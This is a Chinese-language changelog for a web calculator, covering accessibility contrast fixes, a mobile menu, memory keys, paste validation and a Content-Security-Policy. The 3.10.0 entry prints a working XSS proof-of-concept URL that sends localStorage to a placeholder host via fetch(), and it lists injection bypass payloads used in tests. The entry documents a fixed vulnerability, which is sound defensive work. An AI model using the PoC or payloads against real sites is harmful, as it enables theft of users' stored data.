# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

---

## [3.11.1] - 2026-08-21 — 焦點指示器：補完 WCAG 2.4.7 / 1.4.11

v3.11.0 的 a11y 稽核掃到但不屬於當次改動範圍的四處遺留問題，連同追查過程中發現的
一個**站台級缺陷**一併修掉。所有數值都在 375×812、深淺兩個主題下實測 computed style
取得，非查表推算。

### 🐛 修正（P0）：全站鍵盤焦點環在淺色主題全數不及格

`:focus-visible` 的全站焦點環用 `outline: 3px solid var(--primary)`。因為有
`outline-offset: 2px`，環落在元件**外側**，相鄰色是面板／頁面底而不是元件填色：

| 主題 | 相鄰底色 | 對比 | |
|------|---------|------|---|
| 深色 | `#0f172a` / `#1e293b` / `#334155` | 7.35 / 6.03 / 4.26:1 | 合格 |
| 淺色 | `#f8fafc` / `#ffffff` / `#f1f5f9` | **2.32 / 2.43 / 2.22:1** | **全數不及格** |

影響範圍是**每一個可聚焦元件**，不只下面列的四處。改用 `--border-accent`
（淺色主題覆寫為 `#0e7490`）後淺色為 4.89–5.36:1。

### 🐛 修正：Pro modal 內焦點環（修上一條時發現的連帶問題）

`.pro-modal-content` 的底色是固定深色漸層 `#1e293b → #0f172a`，**不隨主題翻轉**，
但 `--border-accent` 會。淺色主題下環變成 `#0e7490` 打在深底上，只有 **2.73:1**。

在 `.pro-modal-overlay` 上把 token 釘回深色版（`--border-accent: #06b6d4`），得 6.03–7.35:1。
全站唯一有此問題的容器 —— `.main-sidebar`、`.panel`、`.base-displays` 等固定深底
都已有 `body.light` 覆寫。

### 🐛 修正：基礎狀態的 `outline: none`（WCAG 2.4.7）

`.unit-select`、`.foreign-select` 在**基礎狀態**寫了 `outline: none`。實測上因為全站
`:focus-visible` 規則帶 `!important` 而未真正失去焦點環，但這等於把可及性押在另一條
規則的 `!important` 上。四處一律改為只在 `:focus:not(:focus-visible)` 移除，
鍵盤焦點交還給全站環。

### 🐛 修正：換邊框色當焦點指示器未達 1.4.11 的 3:1

| 元件 | 原本 | 淺色實測 | 改為 | 改後 |
|------|------|---------|------|------|
| `.graph-expr-input:focus` | `var(--primary)` | 2.22 / 2.43:1 | `var(--border-accent)` | 4.89 / 5.36:1 |
| `.foreign-select:focus` | 寫死 `#10b981` | 2.42 / 2.54:1 | `var(--border-accent-green)` | 5.01–5.24:1 |
| `.unit-select:focus` | `var(--primary)` | 2.32:1 | `var(--border-accent)` | 5.02:1 |
| `.pro-license-input input:focus` | 寫死 `#f59e0b` | 6.81–8.31:1 | 不變 | — |

Pro modal 的琥珀色本來就合格（該 modal 底色固定深色），只補回焦點環，顏色不動。
`.foreign-select` 順手移除了違反專案規則的 hardcode hex。

### ♿ 修正：`<a href="#">` 當按鈕用

`#pricingRestoreLink`（「復原授權」）是 JS 驅動的動作、不是連結目的地，改為
`<button type="button">` 並補 `.pricing-note-btn` 把 UA 按鈕外觀歸零，視覺與原本的
連結一致（同色、同 dashed 底線、同 12.5px）。JS 端移除不再需要的 `preventDefault()`。
實測點擊行為不變：關 pricing modal → 開 pro modal。

### ✅ 驗證

375×812、深淺兩主題，各 7 個目標（含全站環代表、四處修正點、Pro modal 關閉鈕）
全部 `:focus-visible` 命中且環與邊框皆 ≥ 3:1；最低值為淺色主題 `.foreign-select`
的 4.90:1。Console 無錯誤。

> 量測註記：`.pro-modal-content` 用 `background-image: linear-gradient(...)`，
> `backgroundColor` 是透明 —— 只讀 `backgroundColor` 會抓到底下的遮罩層而得出錯誤結論。
> 另外元件多帶 `transition`，`focus()` 後需等收斂再讀，否則量到動畫中途值。

---

## [3.11.0] - 2026-08-15 — 行動版：三槓功能選單 + 修掉整頁橫向溢出

### 🐛 修正（P0）：≤768px 整頁橫向溢出

行動版的 `.main-grid` 用 `grid-template-columns: 1fr`，而 **`1fr` 軌道的自動最小值是
min-content**。`.panel` 的 min-content 被裡面 4 欄鍵盤撐到 411px，容器只有 335px，軌道
因此拒絕縮小 —— 375px 寬時整頁 `scrollWidth` 是 **478px（超出 27%）**，320px 寬時同樣
478px（**超出 49%**）。實際後果是運算子整欄（`÷ × − + =` 與 `C ←`）跑到畫面外，
**手機上必須橫捲才點得到等號鍵**。單位分頁更寬，到 513px。

改成 `minmax(0, 1fr)`。五個分頁 × 320 / 375 / 414 三個寬度實測 `scrollWidth === clientWidth`。

> ⚠️ 這條規則本身帶 `!important`，且 `.main-grid` 元素上還有 inline 的
> `grid-template-columns` —— 覆寫時必須一併帶 `!important`，否則毫無作用。

### ✨ 新增：行動版三槓功能選單

≤768px 時，`.controls`（7 顆按鈕，98px）、`.tabs`（51px）、`.calc-cats`（35px）共 **237px**
收進 header 右側的三槓下拉面板，內部垂直捲動，分五區：功能頁 / 鍵盤 / 工具 / 設定 / 語言。

- **選單不是第二份 markup。** 每次開啟都從上述三處的既有節點重新投影產生，所以標籤、i18n、
  啟用狀態、Pro 徽章文字（`✨ 升級 Pro` / `💎 Pro` / `⏱️ 試用 N 天`，由 `pro-ui.js` 改寫）
  永遠只有一個來源，不會出現「header 改了、選單還是舊的」這種漂移。
- 三槓鈕上顯示目前所在分頁名，解掉 hamburger 最常見的「不知道自己在哪」問題。
- header 在行動版改為 sticky，否則捲到鍵盤時就沒有導覽入口。
- 從別的分頁選鍵盤分類會自動切回計算分頁 —— 那些鍵盤只長在計算分頁裡，不切的話按了沒反應。
- 鍵盤操作：Escape 關閉並還原焦點、上下鍵循環、Tab 移出即關閉（選單不做焦點陷阱）、
  點遮罩關閉。開 modal 前一律先關選單，讓 `trapModalFocus()` 記到的是三槓鈕而不是
  一個馬上要被丟棄的節點。
- 三槓圖示的開合與選單列的選中狀態都由 `aria-expanded` / `aria-checked` 驅動樣式，
  不另外掛 class —— 視覺狀態與無障礙狀態只有一個來源。

**首屏效果（375×812）**：鍵盤第一列從 505px（佔視窗 62%）提前到 226px，
首屏可見按鍵從 **16/27 變成 27/27**，等號鍵不再需要捲動。按鍵也從 63px 寬變 74px。

桌機完全不受影響：兩欄版面、`.controls` / `.tabs` / `.calc-cats` 照舊，
header 維持 static，三槓鈕與面板即使強制 `hidden=false` 也是 `display: none`。

### ♿ 行動版觸控與 iOS 修正

- `viewport` 補上 `viewport-fit=cover`。**底部浮動快捷列裡的 `env(safe-area-inset-bottom)`
  在此之前一直是 0** —— 沒有這個值 `env()` 不會生效，等於那段程式碼從沒作用過，
  快捷鍵會壓在 Home indicator 底下。
- ≤768px 的 `input / select / textarea` 字級拉到 16px。低於 16px 時
  **iOS Safari 一聚焦就自動放大整頁而且不會縮回來**，站上原本有 20 個這種欄位。
- 按鈕加 `touch-action: manipulation`，去掉 double-tap zoom 造成的連按延遲。
- 選單相關的 `:hover` 全部包進 `@media (hover: hover)`，避免觸控點完樣式黏著。
- 選單所有觸控目標 ≥44px（分頁 / 鍵盤 / 工具 / 設定列 48px，語言 chip 44px）。

### 📌 開發過程中被實測抓掉的兩個缺陷

1. **重畫選單會把捲動位置彈回頂端。** 設定類切換（DEG↔RAD / 主題 / 語言）會整份重畫，
   清空 children 讓 `scrollTop` 歸零 —— 捲到「設定」按一下就被彈回「功能頁」。改成重畫前後接回。
2. **焦點還原會誤把焦點推進清單。** 原本無條件把焦點放回同索引，但
   **macOS 與 iOS 點按 `<button>` 不會讓它獲得焦點**（`activeElement` 是 `body`），
   於是索引是 -1、退回第一項，平白給沒在用鍵盤的人一個焦點環還把清單捲回頂端。
   改成只在焦點原本就在選單內時才還原。

### ♿ a11y 閘門（`design:accessibility-review`）抓到並修掉的三項

- **焦點環在淺色主題不合格。** 原本寫 `outline: 2px solid var(--primary)`，
  而 `--primary`（`#06b6d4`）對淺色主題的白底只有 **2.43:1**，低於 WCAG 1.4.11 對
  焦點指示器要求的 3:1。這個 repo 早就為了同一個原因分出 `--border-accent`
  （淺色主題覆寫成 `#0e7490`），改用它之後實測 **深色 6.03:1 / 淺色 5.36:1**。
  選中列的左側標示條同樣改掉。
- **工具列的圖示會被讀出來。** `❤`、`📈`、`?` 只是 header 按鈕字面的重複，
  沒有 `aria-hidden` 時無障礙名稱會變成「紅色愛心 贊助」。補上後名稱乾淨地只剩「贊助」。
- **語言那層 grid 是個沒有名字的巢狀 group。** `role=menu` 底下的 `menuitemradio`
  必須被 menu 或 group 擁有，但無名分組會被螢幕閱讀器報成一個空殼；`aria-labelledby`
  指回「語言」分區標題。

實測通過：兩個主題 × 六類文字全部 ≥4.5:1（最低 6.13:1）、觸控目標全部 ≥44px、
三槓圖示 7.87:1、選中標示條 ≥5.36:1。

### 🎯 anti-slop 閘門（`/taste`）抓到並修掉的一項

- **INT-007「選單缺少完整關閉路徑」**：規則要求非持久性浮層必須在 Escape、外部點擊、
  重新點觸發鈕、**以及換頁**時關閉。站上有 `#/support` 與 `#calc=` 兩種深連結，
  hash 一變就等同換頁 —— 原本選單會留在原地變成蓋在新開 modal 前面的孤兒。
  補上 `hashchange` 關閉。

其餘硬禁訊號掃描（`href="#"` / lorem / `user-scalable` / `maximum-scale` /
`outline: none` / TODO）在本次 diff 中命中 0 筆（站上既有的 5 筆與這次改動無關）。

### 🔧 其他

- 頁面左右內距抽成 `--page-pad-x`（行動版 12px）：sticky header 要用負 margin 打滿寬，
  兩處各寫一份數字遲早漂移。
- 四語系新增 13 個 `nav_*` 鍵。
- `sw.js` `CACHE_NAME` bump 到 `sigma-calc-v3.11.0`（不 bump 既有使用者拿不到這版）。

### ⚠️ 已知未做

- **計算分類（數學 / 工程 / 科學 / 物理 / 進位）本來就沒有 i18n**，選單裡照樣顯示繁中。
  這是既有狀態，不是這次改出來的。
- 繪圖 modal 的 `#graphCanvas` 屬性尺寸仍寫死 720×420，手機上是「能開但難用」，未處理。
- iOS 專屬的三項（`viewport-fit` / 16px 欄位 / `touch-action`）是在 Chromium 上驗證版面無誤，
  **實機 iPhone Safari 尚未實測**。

---

## [3.10.3] - 2026-08-14 — Fix: #79 萬有引力回歸 Free

### 🔧 修正

- **`#79 萬有引力` 的 `tier: 'pro'` 移除，回歸 Free。** 這條公式在 Bobo Labs 公式庫的卡片自建立以來一直標示 Free，且 [萬有引力公式詳解](https://labs.moneyai168.com/formulas/universal-gravitation.html) 是一篇已發布的免費文章 —— 讀者從文章點進 `?formula=79` 卻會撞上 Pro 鎖，等於免費內容承諾跳票。以文章的承諾為準，把這裡改回 Free。
- 連帶影響：物理分類的 Tier 分佈由 12 Free / 9 Pro 回到 **13 Free / 8 Pro**，與 Bobo Labs 公式庫頁的宣告數一致。

### 📌 這個漂移是怎麼被發現的

不是靠人工核對，是把 Bobo Labs 的 97 張公式卡逐筆對回本檔 `builtInFormulas` 時跳出來的唯一一筆不符。**兩邊各自內部一致（卡片 Free + 該頁宣告 13F/8P；registry Pro + 實際 12F/9P），所以任何單邊檢查都看不出問題** —— 只有跨來源比對才照得出來。

---

## [3.10.2] - 2026-08-14 — Security: 加上 Content-Security-Policy

v3.10.0 把兩條外部輸入路徑（貼上、`#calc=`）都收斂到同一套文法驗證了，本版加上第二層：萬一還有沒發現的注入點，限制它**得手之後能做什麼**。

### 🔒 CSP（meta 版）

- **這條 CSP 擋不住 XSS 本身，不要誤以為它有。** `script-src` 必須保留 `'unsafe-inline'`（本檔有 8 個 inline script 與數處 `onclick`）與 `'unsafe-eval'`（`calculate()` 用 `new Function` 求值，是這台計算機的核心）。
- 它買到的是**傷害控制**：`connect-src` / `img-src` / `frame-src` / `base-uri` 把外洩管道封住。v3.10.0 那個 `#calc=` 漏洞的傷害模型正是「payload 執行後把 `localStorage` 送出去」，而那條路現在是死的。
- PayPal 用 wildcard 涵蓋子網域（`c.paypal.com` 之類）以降低金流被誤擋的機率；`*.paypal.com` 一樣匹配不到攻擊者的網域，`connect-src` 的收益幾乎全部保留。

### ⚠️ meta 版 CSP 的兩個先天限制（實測過，不是查文件抄的）

- **不支援 Report-Only**：`<meta http-equiv="Content-Security-Policy-Report-Only">` 會被完全忽略 —— 實測掛上 `img-src 'none'; connect-src 'none'` 的 report-only 政策後，被禁的 fetch 照常成功、且收不到任何 `securitypolicyviolation` 事件。GitHub Pages 不能設 HTTP header，所以**沒有「先觀察一週再收緊」這條路**，只能直接 enforce。
- 不支援 `frame-ancestors` / `report-uri`。
- 回滾成本很低：刪掉那一行 meta 重新部署即可（約 30 秒）。

### ✅ 驗證（本地副本掛上同一份政策實測）

- **合法路徑零違規**：頁面乾淨載入、計算引擎（`2^10+sin(30)` = 1024.5，走 `unsafe-eval`）、記憶鍵、貼上、繪圖 canvas、匯率 API（16 種幣別實際渲染到畫面）、Worker `/health`、PayPal SDK 載入且 `window.paypal` 成形、Subscribe 按鈕渲染成功。
- **六種外洩管道全部被擋**，逐一觸發並以 `securitypolicyviolation` 事件確認：`fetch` 帶 `localStorage` 外送（`connect-src`）、WebSocket（`connect-src`）、注入外部 `<script>`（`script-src-elem`）、`<img>` beacon（`img-src`）、注入 `<iframe>`（`frame-src`）、`<base>` 劫持（`base-uri`）。
  - [WARNING] 第一輪用 `try/catch` + `onerror` 測，得到「WebSocket 沒被擋」的**錯誤結論** —— WebSocket 的 CSP 違規是非同步的，`onerror` 也分不出「CSP 擋下」與「目標網域本來就連不到」。**驗 CSP 只能看 `securitypolicyviolation` 事件。**

### 📌 已知未驗證項

**完整付款流程沒有端到端驗證。** PayPal SDK 載入與 Subscribe 按鈕渲染都通過，但按鈕畫出來的 iframe 是無 `src` 的 `about:blank`，所以 `frame-src` 實際上沒被真正行使；要點擊 Subscribe 才會開 PayPal 視窗，而 sandbox client ID 失效（見開工指引 P1）擋住了那段。用 live plan ID 去點會在 PayPal 帳戶建立 pending subscription，屬於對外部服務產生副作用，故未執行。**上線後請人工點一次 Subscribe（不必完成付款，開得出視窗即可）**；若被擋，刪掉 meta 那行即可回滾。

### [WARNING] 維護注意

新增任何外部資源（換匯率 API、加字型 CDN、換 Worker 網域…）都要同步更新這條 CSP，否則會被**靜默擋掉**。這個 repo 沒有 CI 在守這件事。

## [3.10.1] - 2026-08-14 — A11y: 付款 / 授權碼 modal 的焦點陷阱

v3.10.0 修掉了「pro-modal 開著時打字與貼上會灌進背景計算機」（安全面），但**鍵盤焦點**仍會跑出視窗外 —— 這是同一個根因（`#pro-modal` 用 `hidden` 屬性切換、不帶 `.active`，與本檔其餘 modal 是兩套顯示機制）的另一半。

### ♿ A11y：焦點管理

- **抽出 `trapModalFocus()` / `releaseModalFocus()`**：把「怎麼顯示」與「焦點怎麼管」分開。`openModal()` / `closeModal()`（`.active` 機制）與 `showProModal()` / `hideProModal()`（`hidden` 機制）現在共用同一份焦點實作，而不是在 `js/pro-ui.js` 再寫一份會漂移的。這個 repo 已經因為「兩套 modal 機制」吃過一次虧，不再增加第二處。
- `_modalKeydown` 的 Escape 改為呼叫**注入的**關閉函式（`.active` 的用 `closeModal`，`hidden` 的用 `hideProModal`），而不是寫死一種。
- 開啟時焦點移入 modal、`Tab` / `Shift+Tab` 在 modal 內循環、關閉後焦點還原到當初的觸發按鈕。四條關閉路徑（`×` 按鈕、點背景、modal 內 Escape、pro-ui.js 既有的 document 層 Escape）全部涵蓋，因為它們都收斂在 `hideProModal()`。
- `#pro-modal` 補上 `role="dialog"` / `aria-modal="true"` / `aria-labelledby`（標題加 `id="pro-modal-title"`）。
- `pro-ui.js` 取不到 `window.trapModalFocus` 時 `console.warn` 而不是靜默略過 —— 少了焦點陷阱是使用者看不見的失效。

### ✅ 驗證

- 焦點陷阱：開啟後焦點落在 modal 內、`Tab` 從最後一個循環回第一個、`Shift+Tab` 從第一個回到最後一個、Escape 關閉後焦點還原到 `.pro-badge-btn`、`body` 的 `overflow` 復原。
- **對照組**：先 `releaseModalFocus()` 解除陷阱、modal 仍開著，同一個 `Tab` 事件就不再循環 —— 確認循環行為確實來自新加的陷阱，不是瀏覽器本來就會那樣。
- **modal 轉場**（唯一會交接 `_modalLastFocus` 的路徑）：pricing modal →「復原授權」→ pro-modal，焦點正確移入 pro-modal，關閉後仍還原到最初的 `.pro-badge-btn`。
- 回歸：help modal（`.active` 機制）的焦點陷阱、Escape、焦點還原皆未受重構影響；v3.10.0 的輸入守衛仍成立（pro-modal 開著時鍵盤與貼上不進計算機）；記憶鍵與貼上在 modal 全關後恢復正常；`tests/` 12 個測試全綠。

### 🔧 Chore

- `js/pro-ui.js` 的 cache-bust 由 `?v=3.3.1` bump 到 `?v=3.3.2` —— 改了這支檔案而不 bump，瀏覽器 HTTP cache 會繼續餵舊版（v3.8.1 就是這樣出事的）。SW `CACHE_NAME` 同步 v3.10.1。

## [3.10.0] - 2026-08-14 — Feat: 記憶鍵 M+/M−/MR/MC + 剪貼簿貼上（含一個 CRITICAL 安全修復）

補上兩件「一台計算機本來就該有、這台卻一直沒有」的事，並在安全審查時挖出一個**既有的 CRITICAL XSS**（見下方安全段，與本版新功能無關但一併修掉）。

動工前先實測確認缺口確實存在，而不是憑印象：全檔 `memory` 命中 0（無記憶鍵）、`clipboard` 只有 `writeText`（只出得去、進不來）、5 筆 `Ans` 全部是 JSON-LD 的 `acceptedAnswer` 而非功能。

### 🔒 Security：`#calc=` 網址參數可執行任意 JS（CRITICAL，既有漏洞）

- **問題**：`handleUrlHash()` 把 `decodeURIComponent(location.hash)` 的結果**零驗證**直接寫入 `currentDisplay`，而 `calculate()` 最終是 `new Function('return (' + expr + ')')` 求值。
- **可重現的 PoC**：`https://boboidvtw.github.io/#calc=1,(fetch('//evil/?d='+JSON.stringify(localStorage)))` —— 受害者點開連結（算式自動填好、自動切到「計算」分頁）後只要按一次 `=`，就會執行。JS 的**逗號運算子**讓它成為 `return` 表達式的一部分，而不是 `return` 之後的死碼。本地已實測重現（`window.__xssProof` 被寫入），站台亦無 CSP 可擋。
- **修法**：這條路徑改走本版為貼上寫的同一套文法驗證，驗不過就不填入並顯式提示。兩條外部輸入路徑共用一份標準，不留兩套。
- **這推翻了本版原本的一句設計說明**：初稿寫「貼上是第一次讓外部來源的字串進入 `calculate()`」—— 不成立，`#calc=` 早就是，而且比貼上更寬（完全沒有驗證）、更好利用（一條連結就能散布）。記錄於此以免日後又照著錯誤前提推理。
- 附帶修掉三項同源的縱深問題：
  - **`#pro-modal`（付款 / 授權碼視窗）不在輸入守衛的涵蓋範圍**（HIGH）：它用 `hidden` 屬性切換、不帶 `.active`，`_calcSurfaceBlocked` 的選擇器認不得。實測結果是該視窗開著時打字與貼上會**灌進背景的計算機**，使用者以為自己在填授權碼。這是唯一牽涉金流的視窗。
  - **`factorial()` 沒有上限**：`999…999!` 這種一行輸入會讓分頁凍死。貼上把「刻意按幾十次鍵」降成「貼一次」，故補上 `n > 170 → Infinity`（171! 本來就已溢位）。
  - **貼上驗證與求值端的文法認知不一致**：`5exp(1)` 通過驗證但在 `calculate()` 是 JS 語法錯。目前是 fail-safe，但兩份文法各說各話遲早開洞，改在驗證端就對齊；同時擋掉會提前關閉 `return (…)` 包裝的多餘右括號。

### 🧠 Feat：記憶鍵 M+ / M− / MR / MC

- **位置**：`.display` 下方、分類按鈕上方的獨立一列。**刻意不放進 `.display`** —— 那一整塊綁了「點擊複製結果」，按鈕放進去會變成每按一次記憶鍵就順手複製一次。
- **M+ / M−** 先把**目前算式**求值再累加，不是把字串接上去：螢幕上是 `12×7` 時按 M+ 存進去的是 `84`。算不出值時顯式提示「記憶未變更」，而不是靜靜當成 0 累加。
- **MR 的插入位置有語意**，不是字串串接。三種壞法都是實測出來的：`88` 接 `(−12)` → `88(−12)` 在 JS 裡是「以 88 為 callee 的函式呼叫」→ Error；`88` 接 `12` → `8812`，更糟，靜靜變成一個沒人要的數字、連錯誤訊號都沒有；`sin(30)` 接 `5` → `sin(30)5` → Error。現行規則：尾端正在輸入一個數 → 用記憶值**取代它**；尾端是已完成的值（`)` `!` `%`）→ 補上 `×`；尾端是運算子 / 左括號 / 逗號 → 直接接上。負數自動包括號，減號用 U+2212 與其餘三條輸入路徑一致。
- **MC** 清除。記憶為空時 MC / MR 呈 `disabled`、右側 `M` 指示器留白 —— 指示器空著而不是顯示 `M 0`，否則「記憶存了 0」與「記憶是空的」在畫面上長得一模一樣。
- **持久化**：`localStorage.calcMemory`，寫入端與載入端共用同一個 `Number.isFinite` 不變量（M+ 累加溢位得到的是 `Infinity` 而非 `NaN`，單值防呆攔不到；不擋的話記憶會卡在 `Infinity`，之後每次 MR 都讓算式回 Error）。
- **鍵盤**：`m` 存入（M+）、`r` 讀取（MR）、`Shift`+`M` 清除（MC）。
  - Windows 小算盤那組 `Ctrl+P/Q/R/L` 不採用：在瀏覽器裡會撞掉列印 / 重新整理 / 網址列，與 v3.9.0 立下的「修飾鍵一律放行」原則直接衝突。M− 不綁鍵位 —— 硬湊第四個鍵只會多一條沒人記得住的規則。
  - **[WARNING] 判斷 Shift 必須看 `e.shiftKey`，不能看 `e.key` 是大寫還是小寫**：CapsLock 開著時按 `m` 送出的就是 `'M'`（`shiftKey=false`），靠大小寫分辨會讓「存入記憶」直接變成「清除記憶」。第一版正是這樣寫的，瀏覽器實測時抓到 —— 破壞性操作不能建立在這種訊號上。
- **進位**分類下整條記憶列收起：該模式的輸入是另一套狀態（`baseInput`），與十進位的記憶值不相通。
- i18n 四語（zh-TW / en / zh-CN / ja）同步，並新增 `data-i18n-aria` 支援 —— 記憶鍵的按鈕面只有 `M+` 這種符號，語意全靠 `aria-label`，不跟著切語言的話螢幕閱讀器使用者就永遠停在繁中。

### 📋 Feat：剪貼簿貼上（Ctrl / Cmd + V）

從郵件、試算表、網頁複製來的算式，在此之前只能對著螢幕一個字一個字重打。

- 用 **`paste` 事件**而非攔截 `Ctrl+V`：`clipboardData` 直接拿得到內容、不需要剪貼簿權限提示，而且右鍵貼上、中鍵貼上、觸控長按貼上全走同一條路。
- **正規化**：全形字元、各種 dash（– — ‒ ―）、非標準乘除號（· ⋅ ∗ ∕）、多餘空白 —— 從網頁與 PDF 複製來的算式幾乎一定帶這些。
- **驗證是文法層而非字元層**：整段必須能被 tokenizer 完整吃完（數字 / 已知函數名且後面必須緊接 `(`，`mod` 除外 / 白名單符號），吃不完就**整段拒絕**，不嘗試修好它。「函數名後必須緊接 `(`」這條是關鍵：它讓 `exp.call(1)` 這種「用合法函數名開頭、後面接別的東西」在文法層就被擋下，而不是靠「危險字元有沒有出現」這種開放集合的推理去猜。長度上限 200 字，拒絕時明確說出理由。
- **逗號依括號深度分辨，不能用「整段有沒有函數呼叫」當旗標**：初稿正是那樣寫的，回歸測試才抓到 —— `1,234 + sin(30)` 因為整段含函數呼叫而保留了千分位逗號，於是 JS 的**頂層逗號運算子**靜靜丟掉左邊，算出 `234.5` 而不是 `1234.5`。看起來像個合理答案，錯得毫無症狀。現行做法逐字元追蹤括號層級：在函數參數列內的逗號保留（`nCr(5,123)`），不在參數列內的只能是千分位（拆掉），兩者皆非就整段拒絕（頂層逗號沒有正當用途）。
- **進位**分類下改用該進位的合法位元驗證（BIN 只收 `0`/`1`，以此類推）。
- 守衛與鍵盤輸入共用同一份（新抽出的 `_calcSurfaceBlocked`），否則會出現「打字不會灌進計算機、貼上卻會」這種不對稱。

### ✅ 驗證

- **離線邊界測試**：27 個應接受 + 27 個應拒絕，接受的案例還要求引擎算出**正確答案**（不只是通過驗證）；另有 37 個專門構造的繞過嘗試（`abs.constructor`、`exp.call`、`globalThis`、`\u0061lert(1)`、`1;alert(1)`…）全數被拒。以 `node:vm` 抽出函式離線跑。
- **守門有效性用變異驗證**：tokenizer 改成永遠回 `true` → 測試轉紅（`alert(1)` 通過）；拿掉逗號的深度判斷 → 測試轉紅。還原後全綠。**第一次變異因縮排沒對上而根本沒命中，那次的「全綠」是假訊號**，已修正後重跑。
- **瀏覽器實測**：記憶鍵全流程（存入 / 累加 / 讀取 / 清除 / 負記憶 / 科學記號 / 七種運算子尾端 / 關分頁重開仍在）、貼上（千分位＋函數呼叫、參數保留、頂層逗號拒絕、全形、數字黏函數名拒絕、多餘右括號拒絕）、四道守衛（pro-modal / help modal / 進位分類 / 非計算分頁）、XSS PoC 已擋且合法 `#calc=` 連結未被誤殺。
- **對比度雙主題實測**：mem-btn 文字 淺 16.3 / 深 10.35、邊框（WCAG 1.4.11）淺 4.34 / 深 4.04、指示器 淺 7.14 / 深 8.09 全數合格；停用態 3.27 / 4.06 屬 WCAG 1.4.3 對 disabled 控制項的豁免。
  - 量測本身踩過一次坑並修正：`body` 的背景在 `background-image` 漸層、`backgroundColor` 是透明，第一版掃描器回退白底，讓深色主題量出一整排假違規（指示器 1.69:1）。改為取出漸層所有色停靠點、每個端點各算一次取最差值後才是真值。這是本 repo 第二次踩同一個坑（見 v3.9.0 的 2.15:1 漏網）。

## [3.9.0] - 2026-08-05 — Feat: 實體鍵盤輸入 + 深色主題對比度收尾

本版三件事：補上一台計算機最基本卻一直缺席的輸入方式（實體鍵盤）、把 v3.8.5 只做了一半的對比度稽核做完（深色主題 + 淺色主題剩餘缺口），以及讓儲存列表的 render path 與 v3.5.3/v3.5.4 的安全修復對齊。

### ⌨️ Feat：全域鍵盤輸入（本版重點）

- **問題**：在此之前整份 `index.html` 沒有任何全域按鍵監聽器（`document` / `window` 上的 keydown 為 0 處，只有 modal 焦點陷阱、help 手風琴、繪圖輸入框三處局部監聽）。也就是說桌機使用者**無法用鍵盤輸入數字**，只能滑鼠逐鍵點擊。
- **重構**：把按鈕點擊處理的核心抽成 `applyCalcToken(text)`、進位換算抽成 `applyBaseToken(d)`，讓畫面按鈕與實體鍵盤共用單一入口，避免兩份會漂移的邏輯。
- **對應鍵位**（刻意對應按鈕上的 Unicode 字元，讓打鍵盤與點按鈕產生逐字相同的算式）：
  - 數字 `0`–`9`、小數點 `.`
  - `+` `-` `*` `/` → `+` `−` `×` `÷`
  - `^` 次方、`%` 百分比、`!` 階乘、`|` 絕對值、`(` `)` 括號、`,` 參數分隔
  - `Enter` / `=` 計算、`Backspace` 退格、`Esc` / `Delete` 清除
  - 「進位」分類下改走 `applyBaseToken`：`0`–`9` `A`–`F`（大小寫皆可），不合法的位元顯式擋掉（按鈕靠 `disabled` 擋，鍵盤沒有這層保護）
- **守衛**：`Ctrl`/`Cmd`/`Alt` 組合鍵放行（不搶瀏覽器快捷鍵）、游標在 `input`/`textarea`/`select`/`contenteditable` 內不攔截、任何 modal 開啟時不攔截、只在「計算」tab 生效；焦點在 `button`/`a` 上時 `Enter`/`Space` 交還瀏覽器原生 click（否則一次按鍵觸發兩份行為，也會破壞鍵盤操作按鈕的無障礙語意）。
- **用捕獲階段而非冒泡**：`_modalKeydown` 綁在 modal 元素上，冒泡時它已先跑完並移除 `.active`，document 端再檢查就看不到 modal 了 —— 實測到的症狀是「按 Esc 關閉說明視窗會連帶把計算機清成 0」。改用 capture 後狀態才是準的。
- **視覺回饋**：`.btn-keypress`（`transform: scale(0.94)` + `opacity`，只動合成屬性、不觸發 layout），找不到對應的可見按鈕就不閃，避免給出「有輸入」的假回饋；`prefers-reduced-motion` 下不縮放。
- 說明 modal 新增「⌨️ 鍵盤快捷鍵」章節。

### 🐛 Fix：Error 後無法接續輸入

`calculate()` 回 `Error` 後再按任何鍵會變成 `Error7` 這種死狀態，使用者只能按 `C` 才救得回來。改為任何非 `=` 的輸入自動先重置為 `0`。（物理常數按鈕同步處理。）

### ♿ A11y：深色主題文字對比度（WCAG 2.1 AA）

v3.8.5 只修了淺色主題，深色主題的既有缺口留在 backlog。本次用 alpha-compositing 掃描器實測全站（含所有 tab、5 個 modal、隱藏的分類面板），**深色主題純色背景違規 236 → 0**。

- **根因與 v3.8.5 同源**：飽和強調色直接當文字色。`:root`（深色主題）的六個 `*-text` token 原本等同原始強調色，本次改為提亮版：`--primary-text` `#22d3ee`、`--green-text` `#34d399`、`--physics-text` `#c4b5fd`、`--finance-text` `#fda4af`、`--custom-text` `#fdba74`（`--science-text` 實測通過，不動）
- **新增 `--red-text`**：`--red`(`#dc2626`) 當文字色在深色底只有 2.56–2.70:1（`C` / `←` / 刪除鈕）。深色 `#fca5a5`、淺色 `#b91c1c`（淺色沿用 `--red` 實測也只有 3.49:1）
- **白字配實心強調色底**：`#fff` 對 `--primary` 僅 2.43:1、對 `--green` 僅 2.54:1。`.graph-mode-tab.active` / `.graph-tool.active` / `.pricing-cycle-btn.active` / `.graph-btn` 改用既有的 `--text-on-accent`
- **`--purple` `#8b5cf6` → `#7c3aed`**：violet-500 當實心底時白字只有 4.22:1
- **`.const-label`**：原 `rgba(167,139,250,0.7)` 的 alpha 把 4.31:1 拉低到 2.90:1，改直接用 `--physics-text`
- **贊助按鈕品牌色**：`#f43f5e` / `#ea4aaa` / `#29abe0` 在深色底可讀、淺色底不可讀，改為 `--support-rose` / `--support-pink` / `--support-sky` 雙主題 token

### ♿ A11y：淺色主題 v3.8.5 漏掉的缺口

同一輪掃描順帶掃出淺色主題**純色背景違規 18 筆**（v3.8.5 之後殘留），一併修完歸零：

- `.base-row.active-row .base-value` 寫死 `#ffffff` → 淺色主題白字白底 **1.17:1**，改用 `--text-dark`
- `.btn-calculate`（公式 modal 的「計算」鈕）用 `--bg-dark` 當文字色 → 淺色主題下 `--bg-dark` 是近白的 `#f8fafc`，**2.32:1**，改用 `--text-on-accent`
- 側欄「支援函數」區塊用 inline 的 `rgba(15,23,42,0.6)` 寫死深底、淺色主題無對應覆寫 → **1.61:1**，抽成 `.sidebar-note` 並比照 `.base-displays` 補上 `body.light` 覆寫
- Pro modal 底色是寫死的深色漸層、不隨主題翻轉，但 `h3`/`h4` 跟著全域 `h3, h4 { color: var(--text-dark) }` → 淺色主題下深字配深底 **1.23:1**，改為 `.pro-modal-content h3, .pro-modal-content h4` 釘住淺色
